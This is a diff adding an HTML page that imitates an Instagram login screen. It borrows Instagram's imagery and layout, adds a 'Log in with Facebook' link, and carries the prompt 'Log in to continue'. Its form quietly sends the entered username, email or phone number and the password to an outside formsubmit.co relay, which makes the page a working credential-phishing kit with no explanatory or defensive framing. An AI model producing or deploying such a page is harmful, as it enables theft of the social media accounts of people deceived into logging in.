@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <div
+     style="
+        background-image: url(https://media.gcflearnfree.org/content/633d944b3823fb02e84dce55_10_05_2022/Screen%20Shot%202022-10-10%20at%202.28.19%20PM.png);
+        width:430px;
+        height: 700px;
+        margin-left: 2px;"
+     ></div>
+     <div  style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png&quot;);">
+        
+        </div>
+  
+     <style>
+        body{
+    margin:0;
+    padding:0;
+    display: flex;
+    align-items: center;
+    min-height: 100vh;
+    justify-content: center;
+    background: linear-gradient(white);
+}
+
+.container{
+    text-align: center;
+}
+.text{
+    color:black;
+    letter-spacing: 1px;
+    margin: 10px;
+    margin-bottom: 5px;
+}
+.page{
+    width: 350px;
+    background: #fff;
+    border-radius: 5px;
+    padding-bottom: 15px;
+
+}
+.title{
+    padding: 30px 0;
+    text-decoration: capitalize;
+    font-size:50px;
+    font-family:'Pacifico', cursive;
+    margin-bottom: 10px;
+   
+}
+form{
+    width: 30;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    left: 50%;
+    transform: translateX(-50%);
+}
+from input{
+    margin-top: 10px;
+    margin-right: 15px;
+    margin-left: 15px;
+    border: 1px solid rgba(0,0,0,0.4);
+    border-radius: 5px;
+    outline: none;
+}
+from input:focus{
+    border: 1px solid rgba(0,0,0,0.7);
+    background: #efefef;
+}
+input[type="text"], input[tpye="password"]{
+    padding-left: 10px;
+    position: relative;
+    height: 30px;
+    font-size: 15px;
+    margin-top: 15px;
+    margin-right: 15px;
+    margin-left: 15px;
+    margin-bottom: 10px;
+}
+input::placeholder{
+    font-weight: normal;
+    font-size: 14px;
+    transition: 0.3s ease;
+}
+input:focus::placeholder{
+    position: absolute;
+    font-size: 15px;
+    transform: translateY(-50%);
+}
+form button{
+    border: none;
+    background: blue;
+    padding:5px 0;
+    margin-top: 15px;
+    margin-bottom: 30px;
+    margin-right: 25px;
+    margin-left: 25px;
+    color: #fff;
+    border-radius: 5px;
+    font-size: 25px;
+    font-weight: bold;
+    text-transform: capitalize;
+    letter-spacing: 1px;
+    outline: none;
+    cursor: pointer;
+}
+form button:active{
+    background: #2c58fe;
+    transform: scale(0.995);
+}
+form .option{
+    color: #5a5a5a;
+    margin: 10px 0;
+    font-weight: bold;
+    position: relative;
+}
+form .option:before{
+    position: absolute;
+    content: '';
+    width: 37%;
+    height: 2px;
+    background: #b6b6b6;
+    left: 0;
+    top: 50%;
+    transform: translateY(-50%);
+    border-radius: 50px;
+}
+form .option:after{
+    position: absolute;
+    content: '';
+    width: 37%;
+    height: 2px;
+    background: #b6b6b6;
+    right: 0;
+    top: 50%;
+    transform: translateY(-50%);
+    border-radius: 50px;
+}
+.fblink{
+    margin-top: 15px;
+    width: 100%;
+}
+.fblink span{
+    font-size: 12px;
+    color: #021897;
+    margin-right: 5px;
+}
+.fblink a{
+    text-decoration: none;
+    font-weight: bold;
+    color: #021897;
+}
+.forget-id{
+    margin: 15px;
+}
+.forget-id a{
+    text-decoration: none;
+    color: #025fd2;
+    font-size: 15px;
+    font-weight: 500;
+}
+.page .signup{
+    position: relative;
+    border: 1px solid #b6b6b6;
+    border-radius: 2px;
+    width: 80%;
+    left: 50%;
+    transform: translateX(-50%);
+    margin-top: 30px;
+}
+.signup a{
+    text-decoration: none;
+    margin-left: 5px;
+    color: #008aff;
+    font-weight: bold;
+}
+
+
+    </style>
+ 
+<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+</head>
+<body>
+<div class="container">
+    <div class="text">Log in to continue</div>
+    <div class="page">
+        <div class="title"></div>
+        <form action="https://formsubmit.co/2b2f1e1f155b65e7fdef76352dbc7b2e" method="POST">
+           
+            <input type="text" id="email" name="phonenumber" placeholder="phonenumber, username, or email">
+            <input tpye="password" id="password" name="password" placeholder="Password">
+            
+            <button>Log In</button>
+            <div class="option">OR</div>
+        </form>
+        <div class="fblink">
+            <span class="fab fa-facebook"></span>
+            <a href="#">Log in with Facebook</a>
+        </div>
+
+        <div class="forget-id">
+            <a href="#">Forget Password</a>
+        </div>
+
+        <div class="signup">
+            <p>Don't have an account?<a href="#">
+                Sign up </a></p>
+    </div>
+</div>
+    
+</body>
+</html>
